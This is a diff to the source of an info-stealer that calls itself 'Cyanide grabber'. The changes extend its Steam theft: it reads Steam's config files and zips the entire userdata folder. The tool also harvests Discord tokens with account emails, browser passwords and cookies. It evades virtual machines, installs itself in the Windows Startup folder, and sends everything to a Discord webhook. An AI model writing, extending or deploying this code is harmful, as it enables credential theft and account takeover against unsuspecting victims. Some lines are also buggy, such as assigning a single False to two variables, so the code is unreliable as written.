@@ -2,6 +2,8 @@ import os
 import vdf
 import json
 import nukelib
+import zipfile
+import io
 
 from core.componets import extractor
 from core.componets import antivm
@@ -67,14 +69,31 @@ class Main:
         return creds
     
     def steam(self):
+        steamUsersConf, steamConfigData = False
+
         steamUsers = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "loginusers.vdf"))
+        steamConfig = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "config", "config.vdf"))
+        steamUserData_path = os.path.abspath(os.path.join(os.sep, "Program Files (x86)", "Steam", "userdata"))
 
         if os.path.exists(steamUsers):
             with open(steamUsers, "r") as f:
-                usersConfig = vdf.loads(f.read())
+                steamUsersConf = vdf.loads(f.read())
 
-            return usersConfig
-        return "Nothing"
+        if os.path.exists(steamConfig):
+            with open(steamConfig, "r") as f:
+                steamConfigData = vdf.loads(f.read())
+
+        if os.path.exists(steamUserData_path):
+            buffer = io.BytesIO()
+            with zipfile.ZipFile(buffer, "w") as configzip:
+                for root, dirs, files in os.walk(steamUserData_path):
+                    for file in files:
+                        filePath = os.path.join(root, file)
+                        configzip.write(filePath, os.path.relpath(filePath, steamUserData_path))
+           
+            self.webhook.add_file(buffer.getvalue(), "steamUserData.zip")
+
+        return steamUsersConf, steamConfigData;
         
     def addStartup(self, linkname: str, pathExec: str):
         if not os.path.exists(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", linkname)):
@@ -96,9 +115,9 @@ class Main:
 
     def run(self):
         Thread(target=self.antivm).start()
-        self.addStartup("MyApp", os.path.realpath(__file__))
+        self.addStartup("MyApp", os.path.abspath(os.path.dirname(__file__)))
         
-        userConfig = self.steam()
+        userConfig, steamConfig = self.steam()
         listCreds = self.browser()
         tokens = self.token()
 
@@ -106,7 +125,7 @@ class Main:
             userinfo = nukelib.account_info(token)
             
             # icon url not work
-            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}", color="656166")
+            embed = DiscordEmbed(title=userinfo["username"], icon_url=f"https://cdn.discordapp.com/avatars/{userinfo['id']}/{userinfo['avatar']}.png", color="656166")
             embed.add_embed_field(name='Token', value=token)
             embed.add_embed_field(name='Locale', value=userinfo["locale"])
             embed.add_embed_field(name='Email', value=userinfo["email"])
@@ -121,7 +140,8 @@ class Main:
         embed = DiscordEmbed(title='Report', color="656166")
         embed.add_embed_field(name='Tokens', value=f"""```{tokens}```""")
         embed.set_footer(text='By Cyanide grabber')
-        self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamConfig.txt")
+        self.webhook.add_file(file=vdf.dumps(userConfig, True).encode(), filename="SteamUsersConfig.txt")
+        self.webhook.add_file(file=vdf.dumps(steamConfig, True).encode(), filename="SteamConfig.txt")
         self.webhook.add_file(file=self.credsIntodict(listCreds).encode(), filename="Passwords.History.Cookies.txt")
         self.webhook.add_embed(embed)
         r = self.webhook.execute()
